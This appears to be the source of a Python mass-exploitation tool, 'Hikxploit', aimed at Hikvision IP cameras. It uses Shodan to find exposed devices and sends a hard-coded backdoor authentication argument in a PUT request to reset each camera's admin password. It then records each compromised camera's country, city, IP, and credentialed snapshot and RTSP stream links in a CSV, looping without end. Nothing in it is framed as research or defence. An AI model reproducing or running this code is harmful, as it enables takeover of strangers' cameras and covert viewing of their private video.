import os, requests, threading
import datetime, time, sys, itertools
import argparse
import pandas

import shodan 


class Hikxploit:
    def __init__(self, api):
        self.cwd_path           = os.getcwd()
        self.target_dir         = os.path.join(self.cwd_path, 'target')
        self.hosts_file         = os.path.join(self.cwd_path, 'target', 'hosts.csv')
        self.api                = api
        self.host               = []
        self.backdoorAuthArg    = "auth=YWRtaW46MTEK"
        self.newPass            = "admin"
        self.userName           = "admin"
        self.userID             = "1"
        self.isDone             = False
        self.pattern_1          = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        self.pattern_2          = r'(\:).*'
        self.csv_delimiter      = ";"
        if not os.path.exists(self.target_dir):
            os.makedirs(self.target_dir)
        if not os.path.exists(self.hosts_file):
            with open(self.hosts_file , 'w') as f:
                csv_header = "location" + self.csv_delimiter + "city" + self.csv_delimiter + "ip" + self.csv_delimiter + "port" + self.csv_delimiter + "mpeg link" + self.csv_delimiter + "rtsp link"
                f.write(csv_header)
                f.write("\n")

    def _loading(self):
        for c in itertools.cycle(["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]):
            if self.isDone:
                break
            sys.stdout.write('\rloading... ' + c)
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\rDone!     ')

    def _gather_host_shodan(self):
        self.host = []
        self.s = shodan.Shodan(self.api)
        isFound = 0
        try:
            response = self.s.search("App-webs 200 OK")
            for service in response['matches']:
                self.host.append(service['ip_str']+ ":" + str(service['port']))
                isFound += 1
            if isFound > 0:
                print("[+] {} hosts found".format(isFound))
        except:
            pass
    
    @staticmethod
    def _get_time():
        now = datetime.datetime.now()
        current_time = now.strftime("%H:%M:%S")
        return current_time

    @staticmethod
    def _exploit(host_ip, host_port, userId, username, password, backdoorAuthArg):
        userXML = '<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">''.<id>'+ str(userId) + '</id>.<userName>'+ username + '</userName>.<password>'+ password + '</password>.</User>'
        URLBase = "http://"+ host_ip + ":" + str(host_port) + "/"
        URLUpload = URLBase + "Security/users/1?" + backdoorAuthArg
        try:
            x = requests.put(URLUpload, data=userXML).text
            return x
        except:
            pass
    
    def single_exploit(self, host_ip, host_port, userId, username, password):
        exploit = self._exploit(
            host_ip=host_ip, 
            host_port=host_port, 
            userId=userId, 
            username=username,
            password=password,
            backdoorAuthArg=self.backdoorAuthArg
        )
        if "<statusString>OK</statusString>" in exploit:
            print("[+] exploit for {}".format(host_ip))
        else:
            print("[-] cannot exploit for {}".format(host_ip))

    def _mass_exploit(self):
        a = 0
        while a < len(self.host): 
            self.isDone = False  
            hosts_vuln = open(self.hosts_file , 'r').read().splitlines()
            res = self.host[a]
            match1 = re.search(self.pattern_1, res)
            match2 = re.search(self.pattern_2, res)
            target_host = match1.group()
            port_raw = match2.group()
            port = port_raw[1:]
            exploit = self._exploit(
                host_ip=target_host, 
                host_port=port, 
                userId=self.userID, 
                username=self.userName,
                password=self.newPass,
                backdoorAuthArg=self.backdoorAuthArg
            )
            if exploit is not None:
                if "<statusString>OK</statusString>" in exploit:
                    result = self._lookup(ip_host=target_host, port=port, res=res)
                    if result not in hosts_vuln:
                        current_time = self._get_time()
                        print("{}: [+] exploit for {}".format(current_time, res))
                        with open(self.hosts_file ,"a") as f:
                            f.write(result)
                            f.write("\n")
                else:
                    current_time = self._get_time()
                    print("{}: [-] cannot exploit for {}".format(current_time,res))
                    pass
            a += 1
        self.isDone = True
    
    def _lookup(self, ip_host, port, res):
        tmp = self.s.host(ip_host)
        rtsp_link = "False"
        # Get information about the host
        location = tmp["country_name"]
        city = tmp["city"]
        for n in tmp["ports"]:
            if n == 554:
                rtsp_link = "rtsp://" + self.userName + ":" + self.newPass +"@" + res + "/Streaming/channels/1"
        log = "http://" + self.userName + ":" + self.newPass +"@" + res + "/ISAPI/Streaming/channels/1/picture"
        result = location + self.csv_delimiter + city + self.csv_delimiter + ip_host + self.csv_delimiter + port + self.csv_delimiter + log + self.csv_delimiter + rtsp_link  
        return result

    def _sort_data(self):
        df = pandas.read_csv(self.hosts_file, delimiter=self.csv_delimiter)       
        df.sort_values(by=["location","city"], inplace=True)
        df.to_csv(self.hosts_file, index=False, sep=self.csv_delimiter)

    def process(self):
        while True:
            try:
                self._gather_host_shodan()
                self._mass_exploit()
                self._sort_data()
            except KeyboardInterrupt:
                exit()
    
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=str, help="ip target")
    parser.add_argument("--port", type=int, help="port target")
    args = parser.parse_args()

    shodan_api_key = ""
    h = Hikxploit(shodan_api_key) 

    if args.target:
        h.single_exploit(host_ip=args.target, host_port=args.port, userId=1 ,username="admin", password="admin")
        h.single_exploit(host_ip=args.target, host_port=args.port, userId=2 ,username="operator", password="operator")
    else:
        h.process()
        

if __name__ == "__main__":
    main()
